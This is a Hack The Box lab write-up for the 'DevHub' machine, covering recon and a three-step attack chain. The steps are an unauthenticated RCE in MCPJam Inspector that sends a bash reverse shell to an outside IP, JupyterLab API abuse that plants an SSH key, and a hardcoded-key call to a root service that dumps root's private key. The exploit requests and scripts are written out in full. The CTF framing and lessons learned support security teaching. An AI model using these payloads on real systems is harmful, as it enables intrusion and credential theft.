---
title: "HTB: DevHub"
author: ["Dirk"]
date: 2026-06-22T12:39:00+02:00
lastmod: 2026-06-22T13:04:14+02:00
tags: ["jupyter", "privesc", "mcp"]
categories: ["htb", "vulnerability"]
draft: false
weight: 1003
---

| OS         | Linux  |
|------------|--------|
| Difficulty | Medium |
| Status     | Pwned  |

DevHub is a medium-difficulty Linux machine centered around a developer
toolchain: an MCPJam Inspector instance, a JupyterLab server, and an
internal MCP operations service. The attack chain requires chaining
three distinct vulnerabilities. An unauthenticated RCE in MCPJam
Inspector, abuse of a JupyterLab API to achieve lateral movement, and
credential exposure in an internal Flask service to escalate to root.


## Recon {#recon}


### Nmap {#nmap}

```sh
nmap -sC -sV -oA devhub devhub.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
```

Standard two-port surface. The web server announces itself as an
internal development platform. Gobuster against port 80 returns nothing
interesting beyond the index. But the Webinterface on port 80 tells us there
are three services running, the mcpjam service on port 6274 and on
8888 runs a jupiterserver and on 5000 runs a OPSMCP server.
The last two only listen to local host but 6274 runs externally exposed.
So I did a nmap against the exposed port to confim:

```sh
nmap -sC -sV devhub.htb -p 6274
```

```text
6274/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     <title>MCPJam Inspector</title>
```

Port 6274 is running MCPJam Inspector. A local-first development
platform for building and testing MCP servers.


### Identifying the Attack Surface {#identifying-the-attack-surface}

A short search for MCPJam Inspector CVEs surfaces CVE-2026-23744
immediately: unauthenticated RCE via an exposed HTTP endpoint. The
Inspector binds to `0.0.0.0` by default and performs no authentication
on its `/api/mcp/connect` endpoint. The `command` and `args` fields
in the JSON body are passed directly to the OS without sanitization.


## Foothold -- CVE-2026-23744 (MCPJam Inspector RCE) {#foothold-cve-2026-23744--mcpjam-inspector-rce}

The exploit is a single HTTP request. The endpoint expects a
`serverConfig` object that describes an MCP server to launch. It
spawns the process directly. No token, no session, nothing.

Start a listener:

```sh
nc -lvnp 6666
```

Send the payload via Burp Repeater:

```sh
POST /api/mcp/connect HTTP/1.1
Host: devhub.htb:6274
Content-Type: application/json

{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.15.17/6666 0>&1"],
    "env": {}
  },
  "serverId": "rce_test"
}
```

The server returns a 500. This is expected, because bash is not an MCP
server and closes immediately from the Inspector's perspective. The
reverse shell connects regardless.

```text
Connection received on devhub.htb 50090
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Shell stabilization:

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Gained acces to the `mcp-dev` user.


## Lateral Movement -- JupyterLab API Abuse {#lateral-movement-jupyterlab-api-abuse}


### Enumeration {#enumeration}

Process listing reveals two interesting services running as other users:

```sh
ps aux | grep -E "jupyter|opsmcp"
```

```text
analyst  1055  /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

root     1061  /home/analyst/jupyter-env/bin/python3 \
  /opt/opsmcp/server.py
```

JupyterLab is running as `analyst` on localhost port 8888. The token
is visible in the process arguments in cleartext.

Additionally, a Flask service (`server.py`) is running as `root` on
port 5000. That is the next target after we get `analyst`.


### Exploiting JupyterLab via API {#exploiting-jupyterlab-via-api}

`mcp-dev` cannot write to `/home/analyst`. Direct file placement is
out. JupyterLab does not execute notebooks on session creation either.
We need to send code to a kernel ourselves in order to execute code becuase
code gets executed in the analys context.

The Jupyter REST API allows creating notebooks and spawning kernels,
but executing code requires a WebSocket connection to the kernel's
`channels` endpoint. No WebSocket library is available on the box
(no `websocket-client`, no `wscat`, no `websocat`). However, Python's
stdlib `socket` module is sufficient to perform the WebSocket handshake
manually.

**Step 1:** Spawn a kernel via the REST API.

```sh
curl -X POST http://127.0.0.1:8888/api/kernels \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  -H "Content-Type: application/json" \
  -d '{"name": "python3"}'
```

Returns a kernel ID, note it for the next step.

**Step 2:** Create a notebook with our payload using `urllib` (the only
HTTP library available in stdlib).

```python
import urllib.request
import json

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
BASE = "http://127.0.0.1:8888"

pubkey = "ssh-ed25519 AAAA...your_key... kali@kali"

code = """
import os
os.makedirs('/home/analyst/.ssh', exist_ok=True)
with open('/home/analyst/.ssh/authorized_keys', 'a') as f:
    f.write('{}\\n'.format('""" + pubkey + """'))
os.chmod('/home/analyst/.ssh', 0o700)
os.chmod('/home/analyst/.ssh/authorized_keys', 0o600)
"""

notebook = {
    "type": "notebook",
    "content": {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": {
            "kernelspec": {
                "name": "python3",
                "display_name": "Python 3"
            }
        },
        "cells": [{
            "cell_type": "code",
            "source": code,
            "metadata": {},
            "outputs": [],
            "execution_count": None
        }]
    }
}

req = urllib.request.Request(
    f"{BASE}/api/contents/pwn.ipynb",
    data=json.dumps(notebook).encode(),
    headers={
        "Authorization": f"token {TOKEN}",
        "Content-Type": "application/json"
    },
    method="PUT"
)
resp = urllib.request.urlopen(req)
print(resp.status)
```

**Step 3:** Create a session to attach a kernel to the notebook.

```sh
curl -X POST http://127.0.0.1:8888/api/sessions \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  -H "Content-Type: application/json" \
  -d '{
    "kernel": {"name": "python3"},
    "name": "pwn.ipynb",
    "path": "pwn.ipynb",
    "type": "notebook"
  }'
```

Note the new kernel ID from the response.

**Step 4:** Execute the notebook cell by connecting to the kernel's
WebSocket channel and sending a Jupyter messaging protocol
`execute_request` frame. Since no WebSocket library is available,
we implement the handshake and framing manually using Python's
`socket` module:

This code was created with help of some AI slop tool.

```python
import socket
import hashlib
import base64
import json
import uuid
import os
import struct

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "<kernel-id-from-session-response>"

def ws_frame(data):
    data = data.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    length = len(data)
    if length <= 125:
        header = struct.pack("!BB", 0x81, 0x80 | length)
    else:
        header = struct.pack("!BBH", 0x81, 0xFE, length)
    return header + mask + masked

def recv_ws(s):
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(chunk) < 4096:
            break
    return data

key = base64.b64encode(os.urandom(16)).decode()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.settimeout(5)

handshake = (
    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
    f"Host: 127.0.0.1:8888\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.send(handshake.encode())
s.recv(4096)  # 101 Switching Protocols

msg = {
    "header": {
        "msg_id": str(uuid.uuid4()),
        "msg_type": "execute_request",
        "username": "user",
        "session": str(uuid.uuid4()),
        "version": "5.3"
    },
    "parent_header": {},
    "metadata": {},
    "content": {
        "code": open('/dev/stdin').read(),
        "silent": False,
        "store_history": False
    },
    "channel": "shell"
}

# inject the notebook cell code via execute_request
msg["content"]["code"] = (
    "import os\n"
    "os.makedirs('/home/analyst/.ssh', exist_ok=True)\n"
    "open('/home/analyst/.ssh/authorized_keys','a')"
    ".write('ssh-ed25519 AAAA...your_key...\\n')\n"
    "os.chmod('/home/analyst/.ssh', 0o700)\n"
    "os.chmod('/home/analyst/.ssh/authorized_keys', 0o600)\n"
)

s.send(ws_frame(json.dumps(msg)))

try:
    while True:
        print(recv_ws(s)[:200])
except:
    pass

s.close()
```

The kernel responds with `status` messages, the code ran as `analyst`. SSH in:

```sh
ssh analyst@devhub.htb
```


## Privilege Escalation, OPSMCP Credential Exposure {#privilege-escalation-opsmcp-credential-exposure}


### Enumeration {#enumeration}

The process list showed `server.py` running as `root` on port 5000.
The file is owned by `analyst` and readable:

```sh
ls -al /opt/opsmcp/
cat /opt/opsmcp/server.py
```

The Flask application exposes a tool-calling API modeled after MCP.
It has visible tools (`ops.system_status`, `ops.list_services`, etc.)
and hidden tools not returned by `/tools/list`. The API key is
hardcoded:

```text
VALID_API_KEY = "opsmcp_secret_key_XXXXXXXXXXXXXXXXX"
```

One of the hidden tools is `ops._admin_dump`, which accepts a `target`
parameter. With `target=ssh_keys` and `confirm=true` it reads and
returns `/root/.ssh/id_rsa` directly.


### Exploit {#exploit}

```sh
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }' \
  | python3 -c \
    "import sys,json; print(json.load(sys.stdin)['root_private_key'])" \
  > /tmp/root.key \
  && chmod 600 /tmp/root.key
```

Note: piping directly into a file via Python avoids JSON escape
corruption that occurs when copy-pasting the key from terminal output.

```sh
ssh -i /tmp/root.key root@devhub.htb
```

```text
root@devhub:~#
```


## Lessons Learned {#lessons-learned}

The attack chain illustrates a pattern common in developer tooling:
tools built for convenience in trusted environments exposed with no
hardening. Three independent failures compound into full compromise:

-   MCPJam Inspector's default `0.0.0.0` binding with no authentication
    is CVE-2026-23744. A development tool should never be reachable from
    outside localhost without explicit opt-in.
-   JupyterLab tokens in process arguments are visible to all users via
    `ps aux`. Combined with an API that allows arbitrary kernel
    interactions, this is effectively an unauthenticated code execution
    surface for any local user.
-   The OPSMCP service hardcodes credentials and exposes an admin
    credential dump endpoint with only a static API key as protection,
    while running as root. The hidden tools pattern (present in code,
    absent from `/tools/list`) is security through obscurity and
    provides no real protection once source access is obtained.


## Tools Used {#tools-used}

-   nmap, gobuster
-   Burp Suite (Repeater)
-   netcat
-   curl, python3 stdlib (`urllib`, `socket`)


## References {#references}

-   CVE-2026-23744 Advisory:
    <https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6>
-   Jupyter Messaging Protocol (execute_request):
    <https://jupyter-client.readthedocs.io/en/stable/messaging.html>
-   CrowdSec CVE-2026-23744 writeup:
    <https://www.crowdsec.net/vulntracking-report/cve-2026-23744>
